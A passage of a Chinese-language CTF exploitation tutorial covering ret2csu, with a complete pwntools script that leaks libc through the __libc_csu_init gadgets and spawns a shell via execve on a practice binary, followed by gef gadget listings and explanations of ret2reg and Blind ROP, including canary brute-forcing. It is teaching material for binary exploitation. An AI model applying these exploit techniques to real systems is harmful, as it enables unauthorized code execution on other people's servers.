\n(\n0x400000\n)\n\n\n\n\n\n\u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\n\n\n\u5176\u6b21\uff0c\u5bfb\u627e\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6808\u6ea2\u51fa\n\n\nssize_t\n \nvulnerable_function\n()\n\n\n{\n\n  \nchar\n \nbuf\n;\n \n// [sp+0h] [bp-80h]@1\n\n\n  \nreturn\n \nread\n(\n0\n,\n \nbuf\n,\n \n0x200uLL\n);\n\n\n}\n\n\n\n\n\n\u7b80\u5355\u6d4f\u89c8\u4e0b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u65e2\u6ca1\u6709system\u51fd\u6570\u5730\u5740\uff0c\u4e5f\u6ca1\u6709/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e24\u8005\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u6784\u9020\u4e86\u3002\n\n\n\u6ce8\uff1a\u8fd9\u91cc\u6211\u5c1d\u8bd5\u5728\u6211\u672c\u673a\u4f7f\u7528system\u51fd\u6570\u6765\u83b7\u53d6shell\u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u73af\u5883\u53d8\u91cf\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662fexecve\u6765\u83b7\u53d6shell\u3002\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u83b7\u53d6write\u51fd\u6570\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570\n\n\n\u6839\u636elibcsearcher\u83b7\u53d6\u5bf9\u5e94libc\u7248\u672c\u4ee5\u53caexecve\u51fd\u6570\u5730\u5740\n\n\n\u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u5411bss\u6bb5\u5199\u5165execve\u5730\u5740\u4ee5\u53ca'/bin/sh\u2019\u5730\u5740\uff0c\u5e76\u4f7f\u5f97\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cmain\u51fd\u6570\u3002\n\n\n\u518d\u6b21\u5229\u7528\u6808\u6ea2\u51fa\u6267\u884clibc_csu_gadgets\u6267\u884cexecve('/bin/sh')\u83b7\u53d6shell\u3002\n\n\n\n\nexp\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\n\n##context.log_level = \ndebug\n\n\n\nlevel5\n \n=\n \nELF\n(\n./level5\n)\n\n\nsh\n \n=\n \nprocess\n(\n./level5\n)\n\n\n\nwrite_got\n \n=\n \nlevel5\n.\ngot\n[\nwrite\n]\n\n\nread_got\n \n=\n \nlevel5\n.\ngot\n[\nread\n]\n\n\nmain_addr\n \n=\n \nlevel5\n.\nsymbols\n[\nmain\n]\n\n\nbss_base\n \n=\n \nlevel5\n.\nbss\n()\n\n\ncsu_front_addr\n \n=\n \n0x0000000000400600\n\n\ncsu_end_addr\n \n=\n \n0x000000000040061A\n\n\nfakeebp\n \n=\n \nb\n \n*\n \n8\n\n\n\n\ndef\n \ncsu\n(\nrbx\n,\n \nrbp\n,\n \nr12\n,\n \nr13\n,\n \nr14\n,\n \nr15\n,\n \nlast\n):\n\n    \n# pop rbx,rbp,r12,r13,r14,r15\n\n    \n# rbx should be 0,\n\n    \n# rbp should be 1,enable not to jump\n\n    \n# r12 should be the function we want to call\n\n    \n# rdi=edi=r15d\n\n    \n# rsi=r14\n\n    \n# rdx=r13\n\n    \npayload\n \n=\n \na\n \n*\n \n0x80\n \n+\n \nfakeebp\n\n    \npayload\n \n+=\n \np64\n(\ncsu_end_addr\n)\n \n+\n \np64\n(\nrbx\n)\n \n+\n \np64\n(\nrbp\n)\n \n+\n \np64\n(\nr12\n)\n \n+\n \np64\n(\n\n        \nr13\n)\n \n+\n \np64\n(\nr14\n)\n \n+\n \np64\n(\nr15\n)\n\n    \npayload\n \n+=\n \np64\n(\ncsu_front_addr\n)\n\n    \npayload\n \n+=\n \na\n \n*\n \n0x38\n\n    \npayload\n \n+=\n \np64\n(\nlast\n)\n\n    \nsh\n.\nsend\n(\npayload\n)\n\n    \nsleep\n(\n1\n)\n\n\n\n\nsh\n.\nrecvuntil\n(\nHello, World\n\\n\n)\n\n\n## RDI, RSI, RDX, RCX, R8, R9, more on the stack\n\n\n## write(1,write_got,8)\n\n\ncsu\n(\n0\n,\n \n1\n,\n \nwrite_got\n,\n \n8\n,\n \nwrite_got\n,\n \n1\n,\n \nmain_addr\n)\n\n\n\nwrite_addr\n \n=\n \nu64\n(\nsh\n.\nrecv\n(\n8\n))\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nwrite\n,\n \nwrite_addr\n)\n\n\nlibc_base\n \n=\n \nwrite_addr\n \n-\n \nlibc\n.\ndump\n(\nwrite\n)\n\n\nexecve_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nexecve\n)\n\n\nlog\n.\nsuccess\n(\nexecve_addr \n \n+\n \nhex\n(\nexecve_addr\n))\n\n\n##gdb.attach(sh)\n\n\n\n## read(0,bss_base,16)\n\n\n## read execve_addr and /bin/sh\\x00\n\n\nsh\n.\nrecvuntil\n(\nHello, World\n\\n\n)\n\n\ncsu\n(\n0\n,\n \n1\n,\n \nread_got\n,\n \n16\n,\n \nbss_base\n,\n \n0\n,\n \nmain_addr\n)\n\n\nsh\n.\nsend\n(\np64\n(\nexecve_addr\n)\n \n+\n \n/bin/sh\n\\x00\n)\n\n\n\nsh\n.\nrecvuntil\n(\nHello, World\n\\n\n)\n\n\n## execve(bss_base+8)\n\n\ncsu\n(\n0\n,\n \n1\n,\n \nbss_base\n,\n \n0\n,\n \n0\n,\n \nbss_base\n \n+\n \n8\n,\n \nmain_addr\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u601d\u8003\n\n\n\u6539\u8fdb\n\n\n\u5728\u4e0a\u9762\u7684\u65f6\u5019\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e86\u8fd9\u4e2a\u901a\u7528gadgets\uff0c\u5176\u8f93\u5165\u7684\u5b57\u8282\u957f\u5ea6\u4e3a128\u3002\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u6f0f\u6d1e\u90fd\u53ef\u4ee5\u8ba9\u6211\u4eec\u8f93\u5165\u8fd9\u4e48\u957f\u7684\u5b57\u8282\u3002\u90a3\u4e48\u5f53\u5141\u8bb8\u6211\u4eec\u8f93\u5165\u7684\u5b57\u8282\u6570\u8f83\u5c11\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u6709\u4ec0\u4e48\u529e\u6cd5\u5462\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e86\u51e0\u4e2a\u65b9\u6cd5\n\n\n\u6539\u8fdb1-\u63d0\u524d\u63a7\u5236rbx\u4e0erbp\n\n\n\u53ef\u4ee5\u770b\u5230\u5728\u6211\u4eec\u4e4b\u524d\u7684\u5229\u7528\u4e2d\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u6ee1\u8db3cmp\u7684\u6761\u4ef6\uff0c\u5e76\u8fdb\u884c\u8df3\u8f6c\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u51cf\u5c1116\u5b57\u8282\uff0c\u5373\u6211\u4eec\u6240\u9700\u7684\u5b57\u8282\u6570\u53ea\u9700\u8981112\u3002\n\n\n\u6539\u8fdb2-\u591a\u6b21\u5229\u7528\n\n\n\u5176\u5b9e\uff0c\u6539\u8fdb1\u4e5f\u7b97\u662f\u4e00\u79cd\u591a\u6b21\u5229\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684gadgets\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u8fdb\u884c\u4e24\u6b21\u8c03\u7528\u6765\u8fbe\u5230\u7684\u76ee\u7684\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c11\u4e00\u6b21gadgets\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002\u4f46\u8fd9\u91cc\u7684\u591a\u6b21\u5229\u7528\u9700\u8981\u66f4\u52a0\u4e25\u683c\u7684\u6761\u4ef6\n\n\n\n\n\u6f0f\u6d1e\u53ef\u4ee5\u88ab\u591a\u6b21\u89e6\u53d1\n\n\n\u5728\u4e24\u6b21\u89e6\u53d1\u4e4b\u95f4\uff0c\u7a0b\u5e8f\u5c1a\u672a\u4fee\u6539r12-r15\u5bc4\u5b58\u5668\uff0c\u8fd9\u662f\u56e0\u4e3a\u8981\u4e24\u6b21\u8c03\u7528\u3002\n\n\n\n\n\u5f53\u7136\uff0c\u6709\u65f6\u5019\u6211\u4eec\u4e5f\u4f1a\u9047\u5230\u4e00\u6b21\u6027\u53ef\u4ee5\u8bfb\u5165\u5927\u91cf\u7684\u5b57\u8282\uff0c\u4f46\u662f\u4e0d\u5141\u8bb8\u6f0f\u6d1e\u518d\u6b21\u5229\u7528\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u6211\u4eec\u4e00\u6b21\u6027\u5c06\u6240\u6709\u7684\u5b57\u8282\u5e03\u7f6e\u597d\uff0c\u4e4b\u540e\u6162\u6162\u5229\u7528\u3002\n\n\ngadget\n\n\n\u5176\u5b9e\uff0c\u9664\u4e86\u4e0a\u8ff0\u8fd9\u4e2agadgets\uff0cgcc\u9ed8\u8ba4\u8fd8\u4f1a\u7f16\u8bd1\u8fdb\u53bb\u4e00\u4e9b\u5176\u5b83\u7684\u51fd\u6570\n\n\n_init\n_start\ncall_gmon_start\nderegister_tm_clones\nregister_tm_clones\n__do_global_dtors_aux\nframe_dummy\n__libc_csu_init\n__libc_csu_fini\n_fini\n\n\n\n\n\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u5176\u4e2d\u7684\u4e00\u4e9b\u4ee3\u7801\u6765\u8fdb\u884c\u6267\u884c\u3002\u6b64\u5916\uff0c\u7531\u4e8ePC\u672c\u8eab\u53ea\u662f\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u5730\u5740\u5904\u7684\u6570\u636e\u4f20\u9012\u7ed9CPU\uff0c\u800cCPU\u5219\u53ea\u662f\u5bf9\u4f20\u9012\u6765\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\uff0c\u53ea\u8981\u89e3\u7801\u6210\u529f\uff0c\u5c31\u4f1a\u8fdb\u884c\u6267\u884c\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u6e90\u7a0b\u5e8f\u4e2d\u4e00\u4e9b\u5730\u5740\u8fdb\u884c\u504f\u79fb\u4ece\u800c\u6765\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u7684\u6307\u4ee4\uff0c\u53ea\u8981\u53ef\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u5d29\u6e83\u3002\n\n\n\u9700\u8981\u4e00\u8bf4\u7684\u662f\uff0c\u5728\u4e0a\u9762\u7684libc_csu_init\u4e2d\u6211\u4eec\u4e3b\u8981\u5229\u7528\u4e86\u4ee5\u4e0b\u5bc4\u5b58\u5668\n\n\n\n\n\u5229\u7528\u5c3e\u90e8\u4ee3\u7801\u63a7\u5236\u4e86rbx\uff0crbp\uff0cr12\uff0cr13\uff0cr14\uff0cr15\u3002\n\n\n\u5229\u7528\u4e2d\u95f4\u90e8\u5206\u7684\u4ee3\u7801\u63a7\u5236\u4e86rdx\uff0crsi\uff0cedi\u3002\n\n\n\n\n\u800c\u5176\u5b9elibc_csu_init\u7684\u5c3e\u90e8\u901a\u8fc7\u504f\u79fb\u662f\u53ef\u4ee5\u63a7\u5236\u5176\u4ed6\u5bc4\u5b58\u5668\u7684\u3002\u5176\u4e2d\uff0c0x000000000040061A\u662f\u6b63\u5e38\u7684\u8d77\u59cb\u5730\u5740\uff0c\n\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u57280x000000000040061f\u5904\u53ef\u4ee5\u63a7\u5236rbp\u5bc4\u5b58\u5668\uff0c\u57280x0000000000400621\u5904\u53ef\u4ee5\u63a7\u5236rsi\u5bc4\u5b58\u5668\u3002\n\u800c\u5982\u679c\u60f3\u8981\u6df1\u5165\u5730\u4e86\u89e3\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5c31\u8981\u5bf9\u6c47\u7f16\u6307\u4ee4\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bb5\u8fdb\u884c\u66f4\u52a0\u900f\u5f7b\u5730\u7406\u89e3\u3002\u5982\u4e0b\u3002\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061A\n\n   \n0\nx40061a\n \n__libc_csu_init\n+\n90\n:\n   \npop\n    \nrbx\n\n   \n0\nx40061b\n \n__libc_csu_init\n+\n91\n:\n   \npop\n    \nrbp\n\n   \n0\nx40061c\n \n__libc_csu_init\n+\n92\n:\n   \npop\n    \nr12\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061b\n\n   \n0\nx40061b\n \n__libc_csu_init\n+\n91\n:\n   \npop\n    \nrbp\n\n   \n0\nx40061c\n \n__libc_csu_init\n+\n92\n:\n   \npop\n    \nr12\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061A\n+\n3\n\n   \n0\nx40061d\n \n__libc_csu_init\n+\n93\n:\n   \npop\n    \nrsp\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n \n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061e\n\n   \n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n   \npop\n    \nr13\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061f\n\n   \n0\nx40061f\n \n__libc_csu_init\n+\n95\n:\n   \npop\n    \nrbp\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x0000000000400620\n\n   \n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n   \npop\n    \nr14\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n   \n0\nx400626:\n    \nnop\n    \nWORD\n \nPTR\n \ncs\n:[\nrax\n+\nrax\n*\n1\n+\n0x0\n]\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x0000000000400621\n\n   \n0\nx400621\n \n__libc_csu_init\n+\n97\n:\n   \npop\n    \nrsi\n\n   \n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n   \npop\n    \nr15\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n\ngef\n\u27a4\n  \nx\n/\n5\ni\n \n0x000000000040061A\n+\n9\n\n   \n0\nx400623\n \n__libc_csu_init\n+\n99\n:\n   \npop\n    \nrdi\n\n   \n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n  \nret\n    \n   \n0x400625\n:\n    \nnop\n\n   \n0\nx400626:\n    \nnop\n    \nWORD\n \nPTR\n \ncs\n:[\nrax\n+\nrax\n*\n1\n+\n0x0\n]\n\n   \n0\nx400630\n \n__libc_csu_fini\n:\n  \nrepz\n \nret\n \n\n\n\n\n\u9898\u76ee\n\n\n\n\n2016 XDCTF pwn100\n\n\n2016 \u534e\u5c71\u676f SU_PWN\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttp://wooyun.jozxing.cc/static/drops/papers-7551.html\n\n\nhttp://wooyun.jozxing.cc/static/drops/binary-10638.html\n\n\n\n\nret2reg\n\n\n\u539f\u7406\n\n\n\n\n\u67e5\u770b\u6ea2\u51fa\u51fd\u8fd4\u56de\u65f6\u54ea\u4e2a\u5bc4\u5b58\u503c\u6307\u5411\u6ea2\u51fa\u7f13\u51b2\u533a\u7a7a\u95f4\n\n\n\u7136\u540e\u53cd\u7f16\u8bd1\u4e8c\u8fdb\u5236\uff0c\u67e5\u627ecall reg \u6216\u8005jmp reg\u6307\u4ee4\uff0c\u5c06 EIP\u8bbe\u7f6e\u4e3a\u8be5\u6307\u4ee4\u5730\u5740\n\n\nreg\u6240\u6307\u5411\u7684\u7a7a\u95f4\u4e0a\u6ce8\u5165Shellcode(\u9700\u8981\u786e\u4fdd\u8be5\u7a7a\u95f4\u662f\u53ef\u4ee5\u6267\u884c\u7684\uff0c\u4f46\u901a\u5e38\u90fd\u662f\u6808\u4e0a\u7684)\n\n\n\n\nBROP\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\nBROP(Blind ROP)\u4e8e2014\u5e74\u7531Standford\u7684Andrea Bittau\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\u6210\u679c\u53d1\u8868\u5728Oakland 2014\uff0c\u5176\u8bba\u6587\u9898\u76ee\u662f\nHacking Blind\n\uff0c\u4e0b\u9762\u662f\u4f5c\u8005\u5bf9\u5e94\u7684paper\u548cslides,\u4ee5\u53ca\u4f5c\u8005\u76f8\u5e94\u7684\u4ecb\u7ecd\n\n\n\n\npaper\n\n\nslide\n\n\n\n\nBROP\u662f\u6ca1\u6709\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u6216\u8005\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e0b\uff0c\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb\uff0c\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\n\n\u6e90\u7a0b\u5e8f\u5fc5\u987b\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4ee5\u4fbf\u4e8e\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\n\n\n\u670d\u52a1\u5668\u7aef\u7684\u8fdb\u7a0b\u5728\u5d29\u6e83\u4e4b\u540e\u4f1a\u91cd\u65b0\u542f\u52a8\uff0c\u5e76\u4e14\u91cd\u65b0\u542f\u52a8\u7684\u8fdb\u7a0b\u7684\u5730\u5740\u4e0e\u5148\u524d\u7684\u5730\u5740\u4e00\u6837\uff08\u8fd9\u4e5f\u5c31\u662f\u8bf4\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4f46\u662f\u5176\u53ea\u662f\u5728\u7a0b\u5e8f\u6700\u521d\u542f\u52a8\u7684\u65f6\u5019\u6709\u6548\u679c\uff09\u3002\u76ee\u524dnginx, MySQL, Apache, OpenSSH\u7b49\u670d\u52a1\u5668\u5e94\u7528\u90fd\u662f\u7b26\u5408\u8fd9\u79cd\u7279\u6027\u7684\u3002\n\n\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u76ee\u524d\uff0c\u5927\u90e8\u5206\u5e94\u7528\u90fd\u4f1a\u5f00\u542fASLR\u3001NX\u3001Canary\u4fdd\u62a4\u3002\u8fd9\u91cc\u6211\u4eec\u5206\u522b\u8bb2\u89e3\u5728BROP\u4e2d\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\uff0c\u4ee5\u53ca\u5982\u4f55\u8fdb\u884c\u653b\u51fb\u3002\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u5728BROP\u4e2d\uff0c\u57fa\u672c\u7684\u9075\u5faa\u7684\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5224\u65ad\u6808\u6ea2\u51fa\u957f\u5ea6\n\n\n\u66b4\u529b\u679a\u4e3e\n\n\n\n\n\n\nStack Reading\n\n\n\u83b7\u53d6\u6808\u4e0a\u7684\u6570\u636e\u6765\u6cc4\u9732canaries\uff0c\u4ee5\u53caebp\u548c\u8fd4\u56de\u5730\u5740\u3002\n\n\n\n\n\n\nBind ROP\n\n\n\u627e\u5230\u8db3\u591f\u591a\u7684 gadgets \u6765\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5bf9\u5176\u8fdb\u884c\u8c03\u7528\uff0c\u6bd4\u5982\u8bf4\u5e38\u89c1\u7684 write \u51fd\u6570\u4ee5\u53caputs\u51fd\u6570\u3002\n\n\n\n\n\n\nBuild the exploit\n\n\n\u5229\u7528\u8f93\u51fa\u51fd\u6570\u6765 dump \u51fa\u7a0b\u5e8f\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u7684 gadgets\uff0c\u4ece\u800c\u53ef\u4ee5\u5199\u51fa\u6700\u540e\u7684 exploit\u3002\n\n\n\n\n\n\n\n\n\u6808\u6ea2\u51fa\u957f\u5ea6\n\n\n\u76f4\u63a5\u4ece1\u66b4\u529b\u679a\u4e3e\u5373\u53ef\uff0c\u76f4\u5230\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u3002\n\n\nStack Reading\n\n\n\u5982\u4e0b\u6240\u793a\uff0c\u8fd9\u662f\u76ee\u524d\u7ecf\u5178\u7684\u6808\u5e03\u5c40\n\n\nbuffer|canary|saved fame pointer|saved returned address\n\n\n\n\n\u8981\u5411\u5f97\u5230canary\u4ee5\u53ca\u4e4b\u540e\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u4f55\u5f97\u5230overflow\u7684\u957f\u5ea6\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u6765\u83b7\u53d6\u3002\n\n\n\u5176\u6b21\uff0c\u5173\u4e8ecanary\u4ee5\u53ca\u540e\u9762\u7684\u53d8\u91cf\uff0c\u6240\u91c7\u7528\u7684\u7684\u65b9\u6cd5\u4e00\u81f4\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5canary\u4e3a\u4f8b\u3002\n\n\ncanary\u672c\u8eab\u53ef\u4ee5\u901a\u8fc7\u7206\u7834\u6765\u83b7\u53d6\uff0c\u4f46\u662f\u5982\u679c\u53ea\u662f\u611a\u8822\u5730\u679a\u4e3e\u6240\u6709\u7684\u6570\u503c\u7684\u8bdd\uff0c\u663e\u7136\u662f\u4f4e\u6548\u7684\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u6761\u4ef62\u8868\u660e\u4e86\u7a0b\u5e8f\u672c\u8eab\u5e76\u4e0d\u4f1a\u56e0\u4e3acrash\u6709\u53d8\u5316\uff0c\u6240\u4ee5\u6bcf\u6b21\u7684canary\u7b49\u503c\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u8fdb\u884c\u7206\u7834\u3002\u6b63\u5982\u8bba\u6587\u4e2d\u6240\u5c55\u793a\u7684\uff0c\u6bcf\u4e2a\u5b57\u8282\u6700\u591a\u6709256\u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u572832\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6700\u591a\u9700\u8981\u7206\u78341024\u6b21\uff0c64\u4f4d\u6700\u591a\u7206\u78342048\u6b21\u3002\n\n\n\n\nBlind ROP\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u6700\u6734\u7d20\u7684\u6267\u884cwrite\u51fd\u6570\u7684\u65b9\u6cd5\u5c31\u662f\u6784\u9020\u7cfb\u7edf\u8c03\u7528\u3002\n\n\npop\n \nrdi\n; ret # socket\n\n\npop\n \nrsi\n; ret # buffer\n\n\npop\n \nrdx\n; ret # length\n\n\npop\n \nrax\n; ret # write syscall number\n\n\nsyscall\n\n\n\n\n\n\u4f46\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u90fd\u662f\u6bd4\u8f83\u56f0\u96be\u7684\uff0c\u56e0\u4e3a\u60f3\u8981\u627e\u5230\u4e00\u4e2asyscall\u7684\u5730\u5740\u57fa\u672c\u4e0d\u53ef\u80fd\u3002\u3002\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8f6c\u6362\u4e3a\u627ewrite\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002\n\n\nBROP gadgets\n\n\n\u9996\u5148\uff0c\u5728libc_csu_init\u7684\u7ed3\u5c3e\u4e00\u957f\u4e32\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u6765\u83b7\u53d6write\u51fd\u6570\u8c03\u7528\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002\u6b63\u5982\u6587\u4e2d\u6240\u5c55\u793a\u7684\n\n\n\n\nfind a call write\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7plt\u8868\u6765\u83b7\u53d6write\u7684\u5730\u5740\u3002\n\n\ncontrol rdx\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0crdx\u53ea\u662f\u6211\u4eec\u7528\u6765\u8f93\u51fa\u7a0b\u5e8f\u5b57\u8282\u957f\u5ea6\u7684\u53d8\u91cf\uff0c\u53ea\u8981\u4e0d\u4e3a0\u5373\u53ef\u3002\u4e00\u822c\u6765\u8bf4\u7a0b\u5e8f\u4e2d\u7684rdx\u7ecf\u5e38\u6027\u4f1a\u4e0d\u662f\u96f6\u3002\u4f46\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u63a7\u5236\u7a0b\u5e8f\u8f93\u51fa\uff0c\u6211\u4eec\u4ecd\u7136\u5c3d\u91cf\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e2a\u503c\u3002\u4f46\u662f\uff0c\u5728\u7a0b\u5e8f\n\n\npop\n \nrdx\n; ret\n\n\n\n\n\n\u8fd9\u6837\u7684\u6307\u4ee4\u51e0\u4e4e\u6ca1\u6709\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u63a7\u5236rdx\u7684\u6570\u503c\u5462\uff1f\u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u6267\u884cstrcmp\u7684\u65f6\u5019\uff0crdx\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u5c06\u8981\u88ab\u6bd4\u8f83\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u627e\u5230strcmp\u51fd\u6570\uff0c\u4ece\u800c\u6765\u63a7\u5236rdx\u3002\n\n\n\u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u4e3a\u4e24\u9879\n\n\n\n\n\u5bfb\u627egadgets\n\n\n\u5bfb\u627ePLT\u8868\n\n\nwrite\u5165\u53e3\n\n\nstrcmp\u5165\u53e3\n\n\n\n\n\n\n\n\n\u5bfb\u627egadgets\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u60f3\u529e\u6cd5\u5bfb\u627egadgets\u3002\u6b64\u65f6\uff0c\u7531\u4e8e\u5c1a\u672a\u77e5\u9053\u7a0b\u5e8f\u5177\u4f53\u957f\u4ec0\u4e48\u6837\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u